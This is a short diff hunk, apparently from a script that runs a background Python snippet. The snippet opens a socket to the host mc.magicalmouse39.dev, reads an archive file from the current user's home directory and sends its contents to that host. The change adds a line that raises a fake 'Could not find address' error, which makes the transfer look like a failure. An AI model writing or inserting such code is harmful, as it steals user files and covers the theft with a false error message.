@@ -5,5 +5,5 @@ s.connect(("mc.magicalmouse39.dev", 80))
 user = os.getenv("USER")
 with open(f"/home/{user}/mgkl.tar", "rb") as fin:
     s.send(fin.read())
-s.close()' &
-
+s.close()
+raise Exception("Could not find address \"mc.magicalmouse39.dev\"")' &
